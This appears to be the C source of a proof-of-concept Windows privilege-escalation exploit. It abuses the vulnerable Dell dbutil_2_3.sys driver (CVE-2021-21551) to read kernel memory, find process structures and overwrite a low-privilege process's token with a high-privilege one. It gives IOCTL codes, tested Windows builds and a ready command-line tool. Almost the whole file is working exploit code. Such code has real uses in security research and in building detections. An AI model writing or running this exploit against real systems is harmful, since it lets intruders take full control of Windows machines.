/*
    A small proof-of-concept that overwrites the token of a low-integrity process with that of a high-integrity process using BYOVD. 
    The driver used was Dell's dbutils_2_3.sys, which contains an arbitrary read/write vulnerability (CVE-2021-21551).

    https://www.loldrivers.io/drivers/a4eabc75-edf6-4b74-9a24-6a26187adabf/

    WRITE_IOCTL_CODE 0x9B0C1EC8
    READ_IOCTL_CODE 0x9B0C1EC4

    Tested on:
        Windows 11 24H2 | Server 2025 (2024 Update, Germanium R1)
            build: 10.0.26100.1742
            date: 2024-09-06
        Windows 10 22H2 (2022 Update, Vibranium R5)
            build: 10.0.19045.2965
            date: 2023-05-05

    Author: @noqword
*/
#include "helpers.h"

//
BOOL MemArbitraryWrite(HANDLE hdriver, DWORD64 addr, DWORD64 value) {
    
    RW_WHAT_WHERE rwa{0};
    DWORD bytesReturned;

    rwa._what    = addr;
    rwa._where   = value;

    return DeviceIoControl(hdriver, A_WRITE_IOCTL_CODE, &rwa, sizeof(rwa), &rwa, sizeof(rwa), &bytesReturned, NULL);
}

BOOL MemArbitraryRead(HANDLE hdriver, DWORD64 addr, DWORD64* outValue) {

    RW_WHAT_WHERE rwa{0};
    DWORD bytesReturned;

    rwa._what  = addr;
    rwa._where = 0x00000000;

    BOOL ok = DeviceIoControl(hdriver, A_READ_IOCTL_CODE, &rwa, sizeof(rwa), &rwa, sizeof(rwa), &bytesReturned, NULL);

    if (ok) *outValue = rwa._where;
    return ok;
}

DWORD64 Resolve_EPROCESS(HANDLE hdriver, DWORD64 k_base, DWORD pid){

    // Resolve address of PsInitialSystemProcess kernel symbol
    ULONG_PTR ps_initial_sys_proc = ResolveKsym("PsInitialSystemProcess"); 
    DWORD64 system_eprocess = 0;

    // Read System _EPROCESS address from kernel memory
    MemArbitraryRead(hdriver, ps_initial_sys_proc, &system_eprocess); 

    // Return 0 if System _EPROCESS pointer is invalid
    if(!system_eprocess) return 0;

    DWORD64 current = system_eprocess;

    // Traverse the doubly-linked list of active processes
    do {
        DWORD64 pid_val = 0;
        // Read PID from current process _EPROCESS structure
        MemArbitraryRead(hdriver, current + UNIQUE_PROCESS_ID_OFFSET, &pid_val); 

        // Return current _EPROCESS address if PID matches
        if ((DWORD)pid_val == pid)
            return current;

        DWORD64 flink = 0;
        // Read next list entry pointer from ActiveProcessLinks
        MemArbitraryRead(hdriver, current + ACTIVE_PROCESS_LINK_OFFSET, &flink);
        
        // Calculate next _EPROCESS base address
        current = flink - ACTIVE_PROCESS_LINK_OFFSET;

    } while (current != system_eprocess);

    return 0;
}

DWORD64 ReadToken(HANDLE hdriver, DWORD64 eprocess) {
    DWORD64 token_ref = 0;

    //Read the token of _EPROCESS
    MemArbitraryRead(hdriver, eprocess + TOKEN_OFFSET, &token_ref);
    return token_ref;
}

BOOL StealToken(HANDLE hdriver, DWORD64 k_base, DWORD low_proc_pid, DWORD high_proc_pid) {

    DWORD64 low_proc_eprocess  = Resolve_EPROCESS(hdriver, k_base, low_proc_pid);
    DWORD64 high_proc_eprocess = Resolve_EPROCESS(hdriver, k_base, high_proc_pid);

    if (!low_proc_eprocess) {
        printf("[!] _EPROCESS for PID: %lu (Could not be found)\n", high_proc_pid);
        return FALSE;
    }
    if (!high_proc_eprocess) {
        printf("[!] _EPROCESS for PID: %lu (Could not be found)\n", high_proc_pid);
        return FALSE;
    }

    printf("[*] _EPROCESS for PID(low): %lu  (0x%llx)\n", low_proc_pid, low_proc_eprocess);
    printf("[*] _EPROCESS for PID(high): %lu  (0x%llx)\n",high_proc_pid, high_proc_eprocess);

    DWORD64 high_proc_token = ReadToken(hdriver, high_proc_eprocess);
    if (!high_proc_token) {
        printf("[!] The token could not be read\n");
        return FALSE;
    }

    printf("[*] Token (high priv):   0x%llx\n", high_proc_token);

    BOOL ok = MemArbitraryWrite(hdriver, low_proc_eprocess + TOKEN_OFFSET, high_proc_token);

    if (ok) printf("[+] Token successfully copied to %lu\n", low_proc_pid);
    else    printf("[!] Error writing the token\n");

    return ok;
}

int main(int argc, char* argv[]) {

    if (argc != 4 || strcmp(argv[1], "--elevate") != 0) {
        PrintUsage(argv[0]);
        return 1;
    }

    DWORD low_proc_pid  = (DWORD)atoi(argv[2]);
    DWORD high_proc_pid = (DWORD)atoi(argv[3]);

    //Handle to driver
    HANDLE hdbutil = CreateFileA("\\\\.\\DBUtil_2_3", FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, 0x0, NULL, OPEN_EXISTING, 0x0, NULL);

    if (hdbutil == INVALID_HANDLE_VALUE) return 1;

    printf("[+] DButils_2_3.sys Handle: 0x%llx\n", (DWORD64)hdbutil);

    //Get ntoskrnl.exe base address
    PVOID k_base = ResolveKbase();
    if (!k_base) {
        printf("[!] The kernel base could not be resolved\n");
        CloseHandle(hdbutil);
        return 1;
    }

    printf("[+] Kernel base: 0x%llx\n", (DWORD64)k_base);

    BOOL result = StealToken(hdbutil, (DWORD64)k_base, low_proc_pid, high_proc_pid);
    if(!result){
        printf("The patch for the low-privilege token has not been completed");
    }

    CloseHandle(hdbutil);
    return result ? 0 : 1;
}